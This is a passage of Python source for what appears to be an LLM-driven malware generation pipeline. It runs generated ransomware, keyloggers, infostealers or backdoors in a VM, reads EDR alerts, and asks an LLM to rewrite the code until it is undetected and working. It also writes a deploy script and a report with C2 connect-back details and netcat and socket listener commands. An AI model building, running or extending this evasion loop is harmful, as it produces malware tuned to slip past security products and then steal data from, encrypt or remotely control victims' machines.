                            if not _llm_passed:
                                logger.warning(
                                    "Behavioral validation FAILED (LLM checks, no hardcoded ground truth)"
                                )
                                if self._debug and self._debug.enabled:
                                    self._debug.fail("Behavioral validation: FAIL (LLM checks)")
                            else:
                                logger.info("Behavioral validation: PASS (LLM checks, no hardcoded ground truth)")
                                if self._debug and self._debug.enabled:
                                    self._debug.ok("Behavioral validation: PASS (LLM)")
                        else:
                            result_dict["functional_failed"] = True
                            logger.warning(
                                "Behavioral validation SKIPPED (no plan, no type-specific confirmation) "
                                "— marking as functional failure."
                            )
                            if self._debug and self._debug.enabled:
                                self._debug.fail("Behavioral validation: SKIPPED — no checks, counting as failure")

                        # Privilege detection after confirmed functional success
                        if not result_dict["functional_failed"]:
                            try:
                                _priv_out = await vm_instance.execute_command(
                                    r'net session >NUL 2>&1 && echo ADMIN || echo USER', timeout=10
                                )
                                if "ADMIN" in _priv_out.upper():
                                    _state["current_permissions"] = "admin"
                                    logger.info("Privilege check: ADMIN (elevated)")
                                elif "SYSTEM" in (await vm_instance.execute_command(
                                    r'whoami 2>&1', timeout=5
                                )).upper():
                                    _state["current_permissions"] = "system"
                                    logger.info("Privilege check: SYSTEM")
                                else:
                                    _state["current_permissions"] = "user"
                                    logger.info("Privilege check: user (standard)")
                            except Exception:
                                pass

                    _is_failure = (
                        result_dict["compilation_failed"]
                        or result_dict["execution_crashed"]
                        or result_dict["detection_score"] not in ("none", "error")
                        or result_dict["functional_failed"]
                    )
                    _detected = result_dict["detection_score"] not in ("none", "error")
                    _iter_state.record_attempt(
                        iteration=_iter_state.total_attempts + 1,
                        detected=_detected,
                        edr_name=vresult.alerts[0].edr_name if vresult.alerts else "",
                        rule_name=vresult.alerts[0].rule_name if vresult.alerts else "",
                        detection_category=vresult.alerts[0].detection_category if vresult.alerts else "",
                        message=vresult.alerts[0].message if vresult.alerts else "",
                        compile_failed=result_dict["compilation_failed"],
                    )
                    if output:
                        _iter_state.save(output)
                    if _error_analyzer.available and _is_failure:
                        if result_dict["compilation_failed"] and vresult.compilation_output:
                            # If compile-fix was already tried last iteration and still failed,
                            # skip straight to full-rewrite analysis — patching is not converging.
                            _streak = _state["compile_fix_streak"]
                            if _streak >= 2:
                                logger.warning(
                                    "Compile-fix streak=%d — patch not converging, escalating to full rewrite",
                                    _streak,
                                )
                                _state["compile_fix_streak"] = 0
                                fa = await _error_analyzer.analyze_failure(
                                    source_code=src_code,
                                    failure_mode="compilation_failed",
                                    detection_score=result_dict["detection_score"],
                                    error_output=vresult.compilation_output,
                                )
                                if fa:
                                    fa.full_rewrite_needed = True
                                    _state["last_analysis"] = fa
                                    _state["last_source"]   = src_code
                                    logger.info(
                                        "Forced full rewrite after compile-fix streak: %s", fa.summary[:80]
                                    )
                            else:
                                # Direct compile-fix: Fugu first → local LLM → produce complete fixed source.
                                # If it works the next _generate_fn call returns the fixed source immediately
                                # without another generation round-trip.
                                fixed = await _error_analyzer.fix_compile_error(
                                    src_code, vresult.compilation_output,
                                    language=_src_lang,
                                )
                                if fixed:
                                    _state["fixed_source"] = fixed
                                    _state["compile_fix_streak"] += 1
                                    logger.info("Compile error auto-fixed (%d chars) [streak=%d]",
                                                len(fixed), _state["compile_fix_streak"])
                                else:
                                    # fix_compile_error failed — fall back to failure analysis
                                    _state["compile_fix_streak"] = 0
                                    fa = await _error_analyzer.analyze_failure(
                                        source_code=src_code,
                                        failure_mode="compilation_failed",
                                        detection_score=result_dict["detection_score"],
                                        error_output=vresult.compilation_output,
                                    )
                                    if fa:
                                        _state["last_analysis"] = fa
                                        _state["last_source"]   = src_code
                                        logger.info(
                                            "Compile failure analysis (%s): %s — patch targets: %s",
                                            fa.analyzer_source, fa.summary[:80],
                                            fa.problem_functions or "FULL_REWRITE",
                                        )
                        elif result_dict["functional_failed"]:
                            # Malware ran and evaded AV but produced no observable effect —
                            # treat as a full rewrite with specific behavioral context.
                            _bspec = getattr(target_spec, "behavior_spec", None)
                            _behavioral_ctx = (
                                f"CRITICAL: Malware ran and was undetected but produced NO observable effect. "
                                f"Expected: {_bspec or target_spec.malware_type}. "
                                f"Rewrite so the malware actually performs its intended function — "
                                f"add the missing behavioral implementation, not just the structural skeleton."
                            )
                            fa = await _error_analyzer.analyze_failure(
                                source_code=src_code,
                                failure_mode="functional_failure",
                                detection_score=result_dict["detection_score"],
                                error_output=_behavioral_ctx,
                            )
                            if fa:
                                fa.full_rewrite_needed = True
                                fa.patch_instructions = _behavioral_ctx
                                _state["last_analysis"] = fa
                                _state["last_source"]   = src_code
                                logger.info("Functional failure analysis: full rewrite with behavioral context")
                        else:
                            # Runtime failure or detection — use structured analysis
                            failure_mode = (
                                "execution_crashed" if result_dict["execution_crashed"]
                                else "detected"
                            )
                            _alert_details = "\n".join(
                                f"- [{a.edr_name}] {a.rule_name or a.alert_type}: {a.message}"
                                for a in vresult.alerts if a.message
                            ) or ""
                            fa = await _error_analyzer.analyze_failure(
                                source_code=src_code,
                                failure_mode=failure_mode,
                                detection_score=result_dict["detection_score"],
                                error_output=_alert_details,
                            )
                            if fa:
                                _state["last_analysis"] = fa
                                _state["last_source"]   = src_code
                                logger.info(
                                    "Failure analysis (%s): %s — patch targets: %s",
                                    fa.analyzer_source, fa.summary[:80],
                                    fa.problem_functions or "FULL_REWRITE",
                                )
                    return result_dict
                except Exception as e:
                    logger.error("Verification error: %s", e)
                    if self._debug and self._debug.enabled:
                        self._debug.fail(f"Verify error: {e}")
                    return {"detection_score": "error", "alerts_count": -1, "functional_failed": False}

            async def _reset_vm():
                await vm_instance.restore_snapshot("clean_state")
                await vm_instance.save_snapshot("clean_state")

            loop_result = await self.loop_ctrl.run_loop(
                generate_fn=_generate_fn,
                verify_fn=_verify_fn,
                target_spec=target_spec,
                initial_source=gen_source,
                reset_fn=_reset_vm if _snapshot_tag else None,
                iteration_offset=_iteration_offset,
                on_iteration_complete=_save_checkpoint,
            )
            result.loop_result = loop_result
            if loop_result.final_source and output:
                (output / source_filename(_src_lang)).write_text(loop_result.final_source)
                logger.info("Final source (post-loop) written to %s", output / source_filename(_src_lang))
            if self._debug and self._debug.enabled:
                status = "SUCCESS" if loop_result.success else f"FAILED ({loop_result.total_iterations} iterations)"
                self._debug.ok(f"Verify+Loop complete — {status}")

            if loop_result.success and _ckpt_mgr:
                _ckpt_mgr.clear()

            if loop_result.success and _snapshot_tag and vm_instance and not self._use_existing_vm:
                try:
                    logger.info("Restoring VM to clean snapshot after successful validation...")
                    await vm_instance.restore_snapshot(_snapshot_tag)
                    logger.info("VM restored to '%s' — ready for manual testing", _snapshot_tag)
                except Exception as snap_err:
                    logger.warning("Post-success snapshot restore failed: %s", snap_err)

        elif self._retry_loop and gen_source and vm_instance is None:
            # Local fallback: compile-check loop. Runs when --loop is requested but
            # no VM could be provisioned. Uses gcc -fsyntax-only to verify generated C
            # compiles without errors, iterating with variant seeds until clean or
            # max_iters is reached. -fsyntax-only skips linking so Windows headers
            # don't fail due to missing Win32 libraries on the build host.
            from .verifier import verify_standalone
            if self._debug and self._debug.enabled:
                self._debug.phase("LOCAL-LOOP")

            import shutil as _shutil
            _is_win_target = (target_spec.os_platform.value == "windows")

            # Pick the best available local compiler for the target platform.
            if _src_lang == "go":
                from .code_processor import compile_check_command as _ccc
                _goos = "windows" if _is_win_target else "linux"
                _local_compile_cmd = f"go:build:{_goos}"
                _syntax_only_mode = "go-build"
            elif _src_lang == "rust":
                from .code_processor import compile_check_command as _ccc
                _local_compile_cmd = "rust:check"
                _syntax_only_mode = "rust-check"
            elif _is_win_target:
                if _shutil.which("x86_64-w64-mingw32-gcc"):
                    _local_compile_cmd = "x86_64-w64-mingw32-gcc -fsyntax-only -x c"
                    _syntax_only_mode = "cross-compile"
                else:
                    _local_compile_cmd = None
                    _syntax_only_mode = "structural"
                    logger.warning(
                        "MinGW cross-compiler not found — local loop will use structural "
                        "completeness check instead of compilation. "
                        "Install with: sudo apt install gcc-mingw-w64"
                    )
            else:
                _local_compile_cmd = "gcc -fsyntax-only -x c"
                _syntax_only_mode = "syntax"

            def _structural_check(src_code: str) -> bool:
                """Heuristic: code is 'passing' if it looks structurally complete."""
                s = src_code.strip()
                if len(s) < 200:
                    return False
                if abs(s.count('{') - s.count('}')) > 3:
                    return False
                if abs(s.count('(') - s.count(')')) > 5:
                    return False
                if not s.endswith(('}', '};', '*/', '//')):
                    return False
                return True

            async def _local_verify_fn(src_code: str) -> dict[str, Any]:
                try:
                    if _syntax_only_mode == "structural":
                        compile_ok = _structural_check(src_code)
                        return {
                            "detection_score": "none" if compile_ok else "high",
                            "alerts_count": 0 if compile_ok else 1,
                            "compilation_failed": not compile_ok,
                            "execution_crashed": False,
                            "functional_failed": False,
                            "context_hash": "",
                            "is_undetected": compile_ok,
                        }
                    vresult = await verify_standalone(
                        src_code, target_spec, compile_cmd=_local_compile_cmd, output_dir=output
                    )
                    compile_ok = bool(
                        vresult.behaviour_checks.get(BehaviourCheck.COMPILATION_SUCCESS)
                        or "error" not in (vresult.compilation_output or "").lower()
                    )
                    result_dict = {
                        "detection_score": "none" if compile_ok else "high",
                        "alerts_count": 0 if compile_ok else 1,
                        "compilation_failed": not compile_ok,
                        "execution_crashed": False,
                        "functional_failed": False,
                        "context_hash": "",
                        "is_undetected": compile_ok,
                    }
                    if not compile_ok and vresult.compilation_output and _error_analyzer.available:
                        fixed = await _error_analyzer.fix_compile_error(
                            src_code, vresult.compilation_output,
                            language=_src_lang,
                        )
                        if fixed:
                            _state["fixed_source"] = fixed
                            logger.info("Local compile error auto-fixed (%d chars)", len(fixed))
                        else:
                            fa = await _error_analyzer.analyze_failure(
                                source_code=src_code,
                                failure_mode="compilation_failed",
                                detection_score="high",
                                error_output=vresult.compilation_output,
                            )
                            if fa:
                                _state["last_analysis"] = fa
                                _state["last_source"]   = src_code
                                logger.info(
                                    "Local compile failure analysis (%s): %s",
                                    fa.analyzer_source, fa.summary[:80],
                                )
                    return result_dict
                except Exception as e:
                    logger.error("Local verification error: %s", e)
                    return {"detection_score": "error", "alerts_count": -1, "compilation_failed": True}

            loop_result = await self.loop_ctrl.run_loop(
                generate_fn=_generate_fn,
                verify_fn=_local_verify_fn,
                target_spec=target_spec,
                initial_source=gen_source,
                iteration_offset=_iteration_offset,
                on_iteration_complete=_save_checkpoint if _ckpt_mgr else None,
            )
            result.loop_result = loop_result
            if loop_result.success and _ckpt_mgr:
                _ckpt_mgr.clear()
            if loop_result.final_source and output:
                (output / source_filename(_src_lang)).write_text(loop_result.final_source)
                logger.info("Final source (post-loop) written to %s", output / source_filename(_src_lang))
            if self._debug and self._debug.enabled:
                status = "SUCCESS" if loop_result.success else f"FAILED ({loop_result.total_iterations} iterations)"
                self._debug.ok(f"Local-loop complete — {status}")

        # -- Stage 4: Write final report -------------------------------------
        if output and result.generation_result:
            (output / "pipeline_report.txt").write_text(self._build_report(result))
            # On success, write a deploy-and-test script next to the results
            _loop_ok = result.loop_result and result.loop_result.success
            if _loop_ok and vm_instance is not None:
                _qmp_path = str(vm_instance.qemu.qmp_socket) if vm_instance.qemu else ""
                _deploy_script = self._build_deploy_script(
                    ssh_port=vm_instance.ssh_port or 10022,
                    vm_user=vm_instance.vm_user,
                    vm_pass=vm_instance.vm_pass,
                    qmp_socket=_qmp_path,
                    snapshot_tag=_snapshot_tag or "clean_state",
                    malware_type=_mt,
                )
                (output / "deploy_and_test.py").write_text(_deploy_script)
                logger.info("Deploy script written to %s/deploy_and_test.py", output)
            if self._debug and self._debug.enabled:
                self._debug.ok(f"Report written to {output}/pipeline_report.txt")

        # -- Stage 5: VM storage trim ----------------------------------------
        # Keep at most one ready VM per platform (linux / windows) so disk usage
        # stays bounded. The most recently provisioned VM per platform is kept;
        # all older ones are deleted along with their base images and ISOs.
        self._trim_stored_vms()

        if self._debug and self._debug.enabled:
            self._debug.ok("Pipeline complete")

        return result

    @staticmethod
    def _build_deploy_script(
        ssh_port: int,
        vm_user: str,
        vm_pass: str,
        qmp_socket: str,
        snapshot_tag: str,
        malware_type: str = "",
    ) -> str:
        # Read the current deploy_and_test.py from results/ if it exists;
        # otherwise fall back to a minimal template.  The hand-maintained
        # script in results/ has overlay-based snapshot restore, test file
        # upload, and SSH timeout handling — we don't duplicate that here.
        _results = Path(__file__).parent / "results" / "deploy_and_test.py"
        if _results.exists():
            script = _results.read_text()
            if malware_type:
                _mt_norm = malware_type.strip().lower()
                if "ransom" in _mt_norm or "encrypt" in _mt_norm or "locker" in _mt_norm:
                    _baked = "ransomware"
                elif "keylog" in _mt_norm or "keystroke" in _mt_norm:
                    _baked = "keylogger"
                elif any(k in _mt_norm for k in ("info steal", "infostealer", "credential", "password")):
                    _baked = "infostealer"
                elif any(k in _mt_norm for k in ("backdoor", "rat", "remote access", "c2",
                                                   "reverse shell", "beacon")):
                    _baked = "backdoor"
                else:
                    _baked = "ransomware"
                script = script.replace(
                    "def _detect_malware_type():",
                    f'_BAKED_MALWARE_TYPE = "{_baked}"\n\n\ndef _detect_malware_type():',
                )
                script = script.replace(
                    '    """Detect malware type from spec.yaml or pipeline_report.txt."""\n'
                    '    spec = SCRIPT_DIR.parent / "spec.yaml"',
                    '    """Detect malware type from spec.yaml or pipeline_report.txt."""\n'
                    '    if _BAKED_MALWARE_TYPE:\n'
                    '        return _BAKED_MALWARE_TYPE\n'
                    '    spec = SCRIPT_DIR.parent / "spec.yaml"',
                )
            return script
        return f"""\
#!/usr/bin/env python3
\"\"\"Deploy-and-test script (minimal fallback).\"\"\"
import subprocess, sys
from pathlib import Path

EXE = Path(__file__).parent / "malware_source.exe"
_SSH = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"]

if EXE.exists():
    subprocess.run(["sshpass", "-p{vm_pass}", "scp", "-P", "{ssh_port}", *_SSH,
                     str(EXE), "{vm_user}@localhost:C:\\\\Users\\\\vmuser\\\\malware_test.exe"])
subprocess.run(["sshpass", "-p{vm_pass}", "ssh", "-p", "{ssh_port}", *_SSH,
                 "{vm_user}@localhost"])
"""

    @staticmethod
    def _trim_stored_vms(base_dir: Path = Path("/tmp/vm_provision"), keep: int = 2) -> None:
        """Delete old VM COW snapshots, keeping the ``keep`` most recent globally.

        Only COW disks (per-run VM state) are deleted. Base OS images and VirtIO
        ISOs are left on disk because re-downloading them is expensive — they are
        reused automatically by the next provision run.
        """
        if not base_dir.exists():
            return

        cow_files = list(base_dir.glob("*.cow.qcow2"))
        if len(cow_files) <= keep:
            return

        # Newest first — keep the first ``keep`` entries, delete the rest
        cow_files.sort(key=lambda f: f.stat().st_mtime, reverse=True)
        for cow in cow_files[keep:]:
            try:
                cow.unlink()
                logger.info("VM trim: deleted old snapshot %s", cow)
            except OSError as exc:
                logger.warning("VM trim: could not delete %s: %s", cow, exc)

    def _build_report(self, result: "PipelineResult") -> str:
        """Build a human-readable pipeline report."""
        lines = [
            "=" * 60,
            "MALWARE GENERATION PIPELINE REPORT",
            "=" * 60,
            "",
            f"Target OS: {result.target_spec.os_platform.value} ({result.target_spec.os_version})",
            f"EDRs: {', '.join(result.target_spec.edrs) if result.target_spec.edrs else 'none'}",
        ]

        if result.generation_result:
            lines.append(f"\nGeneration:")
            lines.append(f"  Source code length: {len(result.generation_result.source_code)} chars")
            lines.append(f"  Prompt length: {result.generation_result.prompt_length} chars")
            lines.append(f"  Context hash: {result.generation_result.context_hash}")

        if result.vm_status:
            lines.append(f"\nVM Status: {result.vm_status}")
            if result.ssh_port:
                lines.append(f"SSH Port: {result.ssh_port}")

        if result.loop_result:
            lines.append("")
            lines.append(result.loop_result.summary())

        # Per-EDR detection matrix
        if result.loop_result and result.verification_results:
            _all_alerts = []
            for vr in result.verification_results:
                if hasattr(vr, "alerts"):
                    _all_alerts.extend(vr.alerts)
            edr_names = sorted(set(a.edr_name for a in _all_alerts)) if _all_alerts else []
            if edr_names:
                lines.append("")
                lines.append("=== EDR Detection Matrix ===")
                for ename in edr_names:
                    ea = [a for a in _all_alerts if a.edr_name == ename]
                    status = f"DETECTED ({len(ea)} alerts)" if ea else "UNDETECTED"
                    severities = sorted(set(a.severity for a in ea)) if ea else []
                    sev_str = f" [{', '.join(severities)}]" if severities else ""
                    lines.append(f"  {ename:<25} {status}{sev_str}")

        _mt = (getattr(result.target_spec, "malware_type", "") or "").lower()
        _c2_keywords = ("keylog", "infostealer", "info steal", "rat", "backdoor", "spyware")
        if any(k in _mt for k in _c2_keywords):
            _c2_addr = getattr(result.target_spec, "c2_address", "10.0.2.2")
            _c2_port = getattr(result.target_spec, "c2_port", 9001)
            lines.append("")
            lines.append("=== C2 Listener ===")
            lines.append(f"This malware connects back to {_c2_addr}:{_c2_port}")
            lines.append(f"The portal auto-starts a listener on 0.0.0.0:{_c2_port} after a successful run.")
            lines.append(f"Received data is saved to results/c2_data/c2_received_*.bin")
            lines.append("")
            lines.append("Manual listener (if portal is not running):")
            lines.append(f"  python3 -c \"import socket,sys; s=socket.socket(); "
                         f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); "
                         f"s.bind(('0.0.0.0',{_c2_port})); s.listen(1); "
                         f"print('Listening on :{_c2_port}'); c,a=s.accept(); "
                         f"print(f'Connected: {{a}}'); "
                         f"open('c2_data.bin','wb').write(c.makefile('rb').read()); "
                         f"print('Data saved')\"")
            lines.append(f"  # Or: nc -lvp {_c2_port} > c2_data.bin")

        lines.append("\n" + "=" * 60)
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# PipelineResult — output container
# ---------------------------------------------------------------------------

class PipelineResult:
    """Container for all pipeline outputs."""

    def __init__(
        self,
        target_spec,
        output_dir: Optional[str],
        generation_result,
        verification_results,
        loop_result,
    ):
        self.target_spec = target_spec
        self.output_dir = output_dir
        self.generation_result = generation_result
        self.verification_results = verification_results or []
        self.loop_result = loop_result
        self.vm_status: Optional[str] = None
        self.ssh_port: Optional[int] = None

    def print_summary(self) -> str:
        """Return a concise summary string."""
        lines = [f"Target: {self.target_spec.os_platform.value}/{self.target_spec.os_version}"]

        if self.generation_result:
            code_len = len(self.generation_result.source_code.strip()) if self.generation_result.source_code else 0
            lines.append(f"Generated: {code_len} chars of source code")
            lines.append(f"Context hash: {self.generation_result.context_hash}")

        if self.loop_result and self.loop_result.iterations:
            _DET_RANK = {"none": 0, "low": 1, "medium": 2, "high": 3}
            best = min(self.loop_result.iterations, key=lambda r: _DET_RANK.get(r.detection_score, 4))
            lines.append(f"Best iteration: #{best.iteration} — {best.detection_score}")

        return "\n".join(lines)
